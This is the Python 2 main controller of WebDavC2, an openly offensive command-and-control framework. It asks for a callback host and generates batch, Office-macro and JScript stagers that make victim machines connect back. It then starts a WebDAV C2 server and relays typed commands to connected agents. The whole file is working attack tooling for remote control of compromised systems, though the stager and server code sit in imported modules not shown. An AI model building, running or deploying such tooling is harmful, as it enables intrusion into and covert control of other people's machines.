#!/usr/bin/python
# -*- coding: utf8 -*-
#
# Author: Arno0x0x - https://twitter.com/Arno0x0x
#
# This tool is distributed under the terms of the [GPLv3 licence](http://www.gnu.org/copyleft/gpl.html)

"""

The main controller for the WEbDavC2 agents.

"""

import socket
from threading import Thread, Event
import Queue
import readline

from lib import helpers
from lib.stagers import GenStager
from lib.webdavC2server import WebDavC2Server

# make version and author for WebDavC2
VERSION = "0.2"
AUTHOR = "Arno0x0x - https://twitter.com/Arno0x0x"

#****************************************************************************************
# MAIN Program
#****************************************************************************************
if __name__ == '__main__':

	helpers.printBanner()
	print helpers.color("[*] WebDavC2 controller - Author: {} - Version {}".format(AUTHOR, VERSION))
	
	# Ask for the callback IP or FQDN, to be used in the stagers generation
	serverName = raw_input(helpers.color("[?] Enter agent call back IP or FQDN (ie: this server): "))
	
	# Generating all possible stagers
	GenStager.batch({'serverName': serverName})
	GenStager.macro({'serverName': serverName})
	GenStager.macro2({'serverName': serverName})
	GenStager.macro3({'serverName': serverName})
	GenStager.jscript({'serverName': serverName})

	# Create a Queue for communication between threads
	queue = Queue.Queue(0)
	queue.put(serverName) # Put the serverName into the queue so the server thread can use it
	
	# Create a "connection received" event
	readyEvent = Event()
	
	# Create the server thread and start it
	serverThread = WebDavC2Server(queue, readyEvent)
	serverThread.daemon = True # Yes, we're rude, and when the main thread exists, so does the server thread
	serverThread.start()
	
	#--------------------------------------------------------------------------
	# Main loop
	#--------------------------------------------------------------------------
	while True:
		try:
			# Wait for an agent to connect
			while not readyEvent.is_set():
				readyEvent.wait(1)
			readyEvent.clear()

			# Once an agent is ready get the command
			command = raw_input("Command: ")
			queue.put(command)
			
		#----------------------------------------------------------------------
		# handle ctrl+c's
		except KeyboardInterrupt as e:
			try:
				choice = raw_input(helpers.color("\n[>] Exit? [y/N] ", "red"))
				if choice.lower() != "" and choice.lower()[0] == "y":
					quit()
				else:
					continue
			except KeyboardInterrupt as e:
				continue
